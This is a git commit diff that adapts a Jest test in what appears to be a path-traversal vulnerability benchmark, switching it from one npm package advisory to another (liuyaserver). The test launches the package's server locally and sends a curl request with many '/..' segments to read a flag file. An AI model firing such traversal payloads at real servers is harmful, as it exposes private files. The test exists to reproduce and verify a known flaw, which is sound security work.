d0c4f091e17866f0c820670687f860d16691773c
Filipe Marques <filipe.s.marques@tecnico.ulisboa.pt>
2025-04-26 19:25:22 +0100

    Replace GHSA-rrfc-g2gh-xvjm for GHSA-xj6q-9hx8-mm7f

--- examples/path-traversal/GHSA-xj6q-9hx8-mm7f/liuyaserver.test.js
+++ examples/path-traversal/GHSA-xj6q-9hx8-mm7f/liuyaserver.test.js
@@ -1,28 +1,28 @@
 var execSync = require("child_process").execSync;
 afterAll(() => {
   try {
-    execSync("fuser -k 8888/tcp");
+    execSync("fuser -k 4848/tcp");
   } catch (e) {}
 });
 const path = require("path");
+const { sleep } = require("sleep");
 const pathToFlag = path.resolve(__dirname, "../flag.html");
-function genstr(n) {
+function genstr() {
   return "/..".repeat(50) + pathToFlag;
 }
-test("Path Traversal in 22lixian", (done) => {
+test("Path Traversal in liuyaserver", (done) => {
   expect.assertions(1);
   const fs = require("fs");
-  const sleep = require("sleep");
   const { exec } = require("child_process");
   let hostsFile = fs.readFileSync(pathToFlag).toString();
   const a = require("child_process");
   try {
-    a.execSync("fuser -k 8888/tcp", () => {});
+    a.execSync("fuser -k 4848/tcp", () => {});
   } catch (e) {}
-  let server = "node ./node_modules/22lixian/demo.js";
+  let server = "node ./node_modules/liuyaserver/node.js";
   exec(server, (error, stdout) => {});
-  sleep.sleep(2);
-  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
+  sleep(2);
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:4848${genstr()}"`;
   exec(attack_string, (error, stdout) => {
     expect(stdout).toBe(hostsFile);
     done();
